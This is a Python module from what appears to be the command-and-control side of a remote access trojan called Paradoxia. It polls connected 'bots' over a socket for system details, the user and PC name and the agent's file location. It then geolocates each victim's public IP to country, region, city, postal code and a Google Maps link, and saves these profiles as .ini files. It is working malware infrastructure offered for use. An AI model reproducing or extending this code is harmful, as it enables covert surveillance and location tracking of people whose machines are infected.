"""
Simple Information Database using configparser.
-> Save BOT Info as .ini file.

"""

import geoip2.database
import configparser, datetime
import os
from itertools import cycle
import base64
from colorama import Fore, Style
import colorama 


#from .paradoxia_main import clients

database_path = "GeoLite2-City.mmdb"
info = configparser.ConfigParser()
tnow = datetime.datetime.now()
globalinfo = configparser.ConfigParser()

webbotinfo = []

try:
    globalinfo.read("paradoxia.ini")
except FileNotFoundError:
    print("--> paradoxia Configuration file missing!")
    exit(1)

def WBOTNAMEONLY(file):
    try:
        info.read("bots/"+file+".ini")
        main = info['INFORMATION']
        userpc = main['User-PC']
        return userpc
    except Exception as e:
        return "Error : " + str(e)

def BOTNAMEONLY(file):
    try:
        info.read(file+".ini")
        main = info['INFORMATION']
        userpc = main['User-PC']
        return userpc
    except Exception as e:
        return str(e)

def BOTOSONLY(file):
    try:
        info.read(file+".ini")
        main = info['INFORMATION']
        os = main['OS']
        return os
    except Exception as e:
        return str(e)

def ReadInformation(file):
    try:
        info.read(file+".ini")
        main = info['INFORMATION']
        os = main['OS']
        ram = main['RAM']
        vram = main['VirtualRam']
        minapp = main['MinimumApplicationAddress']
        maxapp = main['MaximumApplicationAddress']
        pagesz = main['PageSize']
        procs = main['Processors']
        agent = main['Agent-Location']
        userpc = main['User-PC']
        wanip = main['WAN']
        ISOCODE = main['ISOCODE']
        country = main['country']
        pcode = main['PostalCode']
        reigon = main['Reigon']
        city = main['City']
        location = main['Location']
        cntime = main['Connected-at']
        
        del webbotinfo[:]
        webbotinfo.append("\nOS                : " + str(os))
        webbotinfo.append("\nRam               : " + str(ram))
        webbotinfo.append("\nVirtual Ram       : " + str(vram))
        webbotinfo.append("\nMin App Address   : " + str(minapp))
        webbotinfo.append("\nMax App Address   : " + str(maxapp))
        webbotinfo.append("\nProcessors        : " + str(procs))
        webbotinfo.append("\nPage size         : " + str(pagesz))
        webbotinfo.append("\nAgent-Location    : " + str(agent))
        webbotinfo.append("\nUser-PC           : " + str(userpc))
        webbotinfo.append("\nWAN               : " + str(wanip))
        webbotinfo.append("\nISO Code          : " + str(ISOCODE))
        webbotinfo.append("\nCountry           : " + str(country))
        webbotinfo.append("\nPostal Code       : " + str(pcode))
        webbotinfo.append("\nReigon            : " + str(reigon))
        webbotinfo.append("\nCity              : " + str(city))
        webbotinfo.append("\nLocation          : " + str(location))
        webbotinfo.append("\nConnected at      : " + str(cntime))
        print("\nReading : '" + file + "' Information\n_____________________\n")
        print("OS                : " + str(os))
        print("Ram               : " + str(ram))
        print("Virtual Ram       : " + str(vram))
        print("Min App Address   : " + str(minapp))
        print("Max App Address   : " + str(maxapp))
        print("Processors        : " + str(procs))
        print("Page size         : " + str(pagesz))
        print("Agent-Location    : " + str(agent))
        print("User-PC           : " + str(userpc))
        print("WAN               : " + str(wanip))
        print("ISO Code          : " + str(ISOCODE))
        print("Country           : " + str(country))
        print("Postal Code       : " + str(pcode))
        print("Reigon            : " + str(reigon))
        print("City              : " + str(city))
        print("Location          : " + str(location))
        print("Connected at      : " + str(cntime))

    except Exception as eread:
        print("Error Reading Information file. ( " + str(eread) + " )")

def SaveInformation(client_socket, filename):

    filename = filename+".ini"
    botsettings = globalinfo['bot']
    def SendData(data):
        try:
            client_socket.send(data.encode())
        except Exception as serror:
            print("[ERROR] " + str(serror))
    
    def SendBytes(data):
    #    data = data.encode()
        try:
            client_socket.send(data)
        except Exception as serror:
            print("[ERROR] " + str(serror))
    

    def WriteToFile():
        with open(filename, "w+") as infofile:
            info['INFORMATION'] = {
                                    'OS' : str(os),
                                    'Ram' : str(ram) + " mb",
                                    'VirtualRam' : str(vram) + " mb",
                                    'MinimumApplicationAddress' : str(minappaddr),
                                    'MaximumApplicationAddress' : str(maxappaddr),
                                    'PageSize' : str(pagesize),
                                    'Processors' : str(processors),
                                    'Agent-Location' : str(agent_location),
                                    'User-PC' : str(user_pc),
                                    'WAN' : str(wanip), 
                                    'ISOCODE' : str(ISO_CODE),
                                    'Country' : str(country),
                                    'PostalCode' : str(pstlcode), 
                                    'Reigon' : str(reigon),
                                    'City' :  str(city),
                                    'Location' : str(location),
                                    'Connected-at' : str(tnow),
                                }

            
            info.write(infofile)
            
    database = geoip2.database.Reader(database_path)
    try:
        SendData("wanip")
        wanip = client_socket.recv(1024).decode()
        SendData("os")
        os = client_socket.recv(1024).decode()
        SendData("ramsize")
        ram = client_socket.recv(1024).decode()
        SendData("vramsize")
        vram = client_socket.recv(1024).decode()
        SendData("pagesize")
        pagesize = client_socket.recv(1024).decode()
        SendData("processors")
        processors = client_socket.recv(1024).decode()
        SendData("minappaddr")
        minappaddr = client_socket.recv(1024).decode()
        SendData("maxappaddr")
        maxappaddr = client_socket.recv(1024).decode()
        SendData("agent")
        agent_location = client_socket.recv(1024).decode()
        SendData("userpc")
        user_pc = client_socket.recv(1024).decode()
        
        if(wanip.startswith("No")):
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Bot was unable to get Wan IP because Target PC does not have active Internet connection.")
            ip_info = "Failed to get"
            ISO_CODE = "Failed to get"
            country = "Failed to get"
            pstlcode = "Failed to get"
            reigon = "Failed to get"
            city = "Failed to get"
            location = "Failed to get"
        else:
            ip_info = database.city(wanip)
            ISO_CODE = ip_info.country.iso_code
            country = ip_info.country.name
            pstlcode = ip_info.postal.code
            reigon = ip_info.subdivisions.most_specific.name
            city = ip_info.city.name
        # location = str(ip_info.location.latitude) + " " + str(ip_info.location.longitude)
            location = "https://www.google.com/maps?q="+str(ip_info.location.latitude)+","+str(ip_info.location.longitude)
        

        if(botsettings['auto_print_bot_info'] == True):
            print("Ram               : " + str(ram))
            print("Virtual Ram       : " + str(vram))
            print("Min App Address   : " + str(minappaddr))
            print("Max App Address   : " + str(maxappaddr))
            print("Processors        : " + str(processors))
            print("Page size         : " + str(pagesize))
            print("Agent-Location    : " + str(agent_location))
            print("User-PC           : " + str(user_pc))
            print("WAN               : " + str(wanip))
            print("ISO Code          : " + str(ISO_CODE))
            print("Country           : " + str(country))
            print("Postal Code       : "+str(pstlcode))
            print("Reigon            : " + str(reigon))
            print("City              : " + str(city))
            print("Location          : " + str(location))
            print("Connected at      : " + str(tnow))
            print("(All this information is saved under " +filename+")")

        try:
            file = open(filename, "r")
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Updating Existing Information.")
            file.close()
            WriteToFile()
        except FileNotFoundError:
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Saving Information.")
            WriteToFile()

    except Exception as e:
        print("Somethings wrong.... Failed to get Information..")
        print("Error : " + str(e))
        pass

